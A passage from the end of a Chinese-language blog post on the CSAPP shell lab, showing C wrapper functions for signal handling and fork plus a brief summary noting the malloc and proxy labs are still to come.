class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stdout</span>, <span class="string">&quot;%s: %s\n&quot;</span>, msg, strerror(errno));</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * app_error - application-style error routine</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">app_error</span><span class="params">(<span class="keyword">char</span> *msg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stdout</span>, <span class="string">&quot;%s\n&quot;</span>, msg);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Signal - wrapper for the sigaction function</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">handler_t</span> *<span class="title">Signal</span><span class="params">(<span class="keyword">int</span> signum, <span class="keyword">handler_t</span> *handler)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sigaction</span> <span class="title">action</span>, <span class="title">old_action</span>;</span></span><br><span class="line"></span><br><span class="line">    action.sa_handler = handler;  </span><br><span class="line">    sigemptyset(&amp;action.sa_mask); <span class="comment">/* block sigs of type being handled */</span></span><br><span class="line">    action.sa_flags = SA_RESTART; <span class="comment">/* restart syscalls if possible */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (sigaction(signum, &amp;action, &amp;old_action) &lt; <span class="number">0</span>)</span><br><span class="line">	unix_error(<span class="string">&quot;Signal error&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> (old_action.sa_handler);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * sigquit_handler - The driver program can gracefully terminate the</span></span><br><span class="line"><span class="comment"> *    child shell by sending it a SIGQUIT signal.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sigquit_handler</span><span class="params">(<span class="keyword">int</span> sig)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Terminating after receipt of SIGQUIT signal\n&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*************************</span></span><br><span class="line"><span class="comment"> * Self-defining function</span></span><br><span class="line"><span class="comment"> *************************/</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">pid_t</span> <span class="title">Fork</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">pid_t</span> pid;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ((pid = fork()) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        unix_error(<span class="string">&quot;Fork error&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> pid;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Sigprocmask</span><span class="params">(<span class="keyword">int</span> how, <span class="keyword">const</span> <span class="keyword">sigset_t</span>* <span class="built_in">set</span>, <span class="keyword">sigset_t</span>* oldset)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (sigprocmask(how, <span class="built_in">set</span>, oldset) &lt; <span class="number">0</span>)</span><br><span class="line">        unix_error(<span class="string">&quot;Sigprocmask error&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Sigemptyset</span><span class="params">(<span class="keyword">sigset_t</span>* <span class="built_in">set</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (sigemptyset(<span class="built_in">set</span>) &lt; <span class="number">0</span>)</span><br><span class="line">        unix_error(<span class="string">&quot;Sigemptyset error&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Sigfillset</span><span class="params">(<span class="keyword">sigset_t</span>* <span class="built_in">set</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (sigfillset(<span class="built_in">set</span>) &lt; <span class="number">0</span>)</span><br><span class="line">        unix_error(<span class="string">&quot;Sigfillset error&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Sigaddset</span><span class="params">(<span class="keyword">sigset_t</span>* <span class="built_in">set</span>, <span class="keyword">int</span> signum)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (sigaddset(<span class="built_in">set</span>, signum) &lt; <span class="number">0</span>)</span><br><span class="line">        unix_error(<span class="string">&quot;Sigaddset error&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Sigdelset</span><span class="params">(<span class="keyword">sigset_t</span>* <span class="built_in">set</span>, <span class="keyword">int</span> signum)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (sigdelset(<span class="built_in">set</span>, signum) &lt; <span class="number">0</span>)</span><br><span class="line">        unix_error(<span class="string">&quot;Sigdelset error&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="小结-3"><a href="#小结-3" class="headerlink" title="小结"></a>小结</h2><p>本实验难度不很大，设计严谨，要求能灵活运用第八章所学知识，是一个非常优秀的实验。<code>2021/8/29</code>做了一整天基本完成，对真是<code>shell</code>背后的原理有了更深刻的了解</p>
<h1 id="MallocLab-amp-ProxyLab"><a href="#MallocLab-amp-ProxyLab" class="headerlink" title="MallocLab &amp; ProxyLab"></a>MallocLab &amp; ProxyLab</h1><p>国庆假期再实现</p>

    </div>

    
    
    

    <footer class="post-footer">

        

          <div class="post-nav">
            <div class="post-nav-item">
                <a href="/2021/03/25/BUG/" rel="prev" title="BUG">
                  <i class="fa fa-chevron-left"></i> BUG
                </a>
            </div>
            <div class="post-nav-item">
                <a href="/2021/07/25/CSAPP-Homework/" rel="next" title="CSAPP-Homework">
                  CSAPP-Homework <i class="fa fa-chevron-right"></i>
                </a>
            </div>
          </div>
    </footer>
  </article>
</div>






      

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      const activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      const commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

    </div>
  </main>

  <footer class="footer">
    <div class="footer-inner">
      

      

<div class="copyright">
  
  &copy; 
  <span itemprop="copyrightYear">2022</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">FEZ</span>
</div>
<div class="wordcount">
  <span class="post-meta-item">
    <span class="post-meta-item-icon">
      <i class="fa fa-chart-line"></i>
    </span>
    <span title="站点总字数">499k</span>
  </span>
  <span class="post-meta-item">
    <span class="post-meta-item-icon">
      <i class="fa fa-coffee"></i>
    </span>
    <span title="站点阅读时长">7:34</span>
  </span>
</div>
  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
  </div>

    </div>
  </footer>

  
  <script src="//cdn.jsdelivr.net/npm/animejs@3.2.1/lib/anime.min.js"></script>
<script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/next-boot.js"></script>

  


















  








  

  
      <script>
  if (typeof MathJax === 'undefined') {
    window.MathJax = {
      tex: {
        inlineMath: {'[+]': [['$', '$']]},
        tags: 'ams'
      },
      options: {
        renderActions: {
          findScript: [10, doc => {
            document.querySelectorAll('script[type^="math/tex"]').forEach(node => {
              const display = !!node.type.match(/; *mode=display/);
              const math = new doc.options.MathItem(node.textContent, doc.inputJax[0], display);
              const text = document.createTextNode('');
              node.parentNode.replaceChild(text, node);
              math.start = {node: text, delim: '', n: 0};
              math.end = {node: text, delim: '', n: 0};
              doc.math.push(math);
            });
          }, '', false],
          insertedScript: [200, () => {
            document.querySelectorAll('mjx-container').forEach(node => {
              const target = node.parentNode;
              if (target.nodeName.toLowerCase() === 'li') {
                target.parentNode.classList.add('has-jax');
              }
            });
          }, '', false]
        }
      }
    };
    const script = document.createElement('script');
    script.src = '//cdn.jsdelivr.net/npm/mathjax@3.1.2/es5/tex-mml-chtml.js';
    script.defer = true;
    document.head.appendChild(script);
  } else {
    MathJax.startup.document.state(0);
    MathJax.typesetClear();
    MathJax.texReset();
    MathJax.typeset();
  }
</script>

    

  

</body>
</html>
